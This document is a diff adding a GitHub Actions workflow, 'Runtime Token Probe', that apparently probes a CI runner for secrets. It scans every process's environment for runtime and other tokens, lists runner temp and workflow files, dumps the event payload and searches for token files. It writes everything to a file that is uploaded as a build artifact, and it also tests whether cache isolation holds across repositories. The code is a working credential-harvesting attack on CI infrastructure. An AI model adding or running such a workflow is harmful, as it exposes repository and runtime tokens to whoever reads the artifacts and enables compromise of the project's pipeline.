@@ -1,0 +1,46 @@
+name: Runtime Token Probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Find all tokens and APIs
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          exec 3>&1 1>/tmp/probe3_output.txt 2>&1
+          echo "=== Looking for runtime token in processes ==="
+          # Find runner processes and their env
+          for pid in $(ps -eo pid= 2>/dev/null); do
+            env_file="/proc/$pid/environ"
+            if [ -r "$env_file" ]; then
+              found=$(cat "$env_file" 2>/dev/null | tr '\0' '\n' | grep -i 'runtime_token\|ACTIONS_RUNTIME\|_TOKEN')
+              if [ -n "$found" ]; then
+                echo "PID $pid:"
+                echo "$found"
+              fi
+            fi
+          done
+          echo "=== Looking in runner temp files ==="
+          ls -la /home/runner/work/_temp/ 2>&1
+          ls -la /home/runner/work/_temp/_github_workflow/ 2>&1
+          echo "=== Event JSON ==="
+          cat "$GITHUB_EVENT_PATH" 2>&1 | head -50
+          echo "=== Tool cache ==="
+          ls /opt/hostedtoolcache/ 2>&1
+          echo "=== Look for any .token files ==="
+          find /home/runner -name "*.token" -o -name "*token*" 2>/dev/null | head -20
+
+      - name: Test cache isolation
+        uses: actions/cache/restore@v4
+        with:
+          path: /tmp/cache_test
+          key: cross-repo-cache-test-${{ runner.os }}
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: probe3-results
+          path: /tmp/probe3_output.txt
